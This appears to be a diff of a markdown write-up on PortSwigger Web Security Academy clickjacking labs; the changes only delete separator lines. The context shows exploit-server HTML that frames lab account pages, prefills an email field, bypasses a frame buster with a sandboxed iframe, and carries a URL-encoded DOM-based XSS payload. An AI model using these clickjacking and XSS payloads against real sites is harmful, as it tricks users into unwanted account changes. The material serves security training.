@@ -13,7 +13,6 @@
 **srcdoc**	**HTML_code	Specifies the HTML content of the page to show in the <iframe>**
 **width**	**pixels	Specifies the width of an <iframe>. Default width is 300 pixels**
 
-**---------------------------------------------------------------------------------------------------------------------------**
 **Lab 1- Basic clickjacking with CSRF token protection**
 
 **Steps**
@@ -39,7 +38,6 @@ p {
 <p>Click Me</p>
 <iframe src=https://0a3e00e0048e06f8806f85e800d50021.web-security-academy.net/my-account></iframe>
 
-**---------------------------------------------------------------------------------------------------------------------------**
 **Lab 2 - Clickjacking with form input data prefilled from a URL parameter**
 
 **Steps**
@@ -65,7 +63,6 @@ p {
 <p>Click Me</p>
 <iframe src="https://0a510088037b3971808949be00ad0056.web-security-academy.net/my-account?email=hellotest@gmail.com"></iframe>
 
-**---------------------------------------------------------------------------------------------------------------------------**
 **Lab 3 - Clickjacking with a frame buster script**
 **Steps**
 **click on goto exploit Server**
@@ -90,7 +87,6 @@ p {
 <p>Click Me</p>
 <iframe sandbox="allow-forms" src="https://0a0200f4032854b383a23712003200cc.web-security-academy.net/my-account?email=hellotest@gmail.com"></iframe>
 
-**---------------------------------------------------------------------------------------------------------------------------**
 **Lab - 4  Exploiting clickjacking vulnerability to trigger DOM-based XSS**
 
 **Steps**
@@ -123,7 +119,6 @@ p {
 <p>Click Me</p>
 <iframe src="https://0ac6009203ecf7a384c0e1c300fd00c4.web-security-academy.net/feedback?name=%3Cimg+src%3Dx+onerror%3Dprint%28%29%3E&email=yesy%40gmail.com&subject=sdfsdfsdf&message=sdfsfsdf#feedbackForm">
 
-**---------------------------------------------------------------------------------------------------------------------------**
 **Lab - 5  Exploiting clickjacking vulnerability to trigger DOM-based XSS**
 
 
